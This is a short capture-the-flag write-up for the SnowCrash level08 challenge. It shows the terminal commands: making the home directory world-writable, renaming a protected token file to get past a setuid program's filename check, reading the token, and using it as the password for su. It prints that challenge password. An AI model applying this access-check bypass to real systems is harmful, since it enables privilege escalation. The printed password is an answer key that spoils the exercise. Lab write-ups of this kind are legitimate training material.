# CTF Report — Level08 Token & Flag Retrieval (English)

---

## Overview

This report documents the exact, unmodified steps you performed to retrieve the token/password and use it to switch user and obtain the flag. All commands and outputs are preserved exactly as you provided.

---

## Steps (verbatim)

```bash
strings level08 
token geçenleri açmıyor 

level08@SnowCrash:~$ chmod 777 .
level08@SnowCrash:~$ cp token asd
cp: cannot open `token' for reading: Permission denied
level08@SnowCrash:~$ mv token asd
level08@SnowCrash:~$ ls
asd  level08
level08@SnowCrash:~$ ./level08 asd
quif5eloekouj29ke0vouxean

su flag08
password ---> quif5eloekouj29ke0vouxean
getflag 
```

---

## Observed token / password

```
quif5eloekouj29ke0vouxean
```

---

## Final action & result

* Used the token as the password for `su flag08`.
* Ran `getflag` as the `flag08` user (command shown but output not included in your snippet).
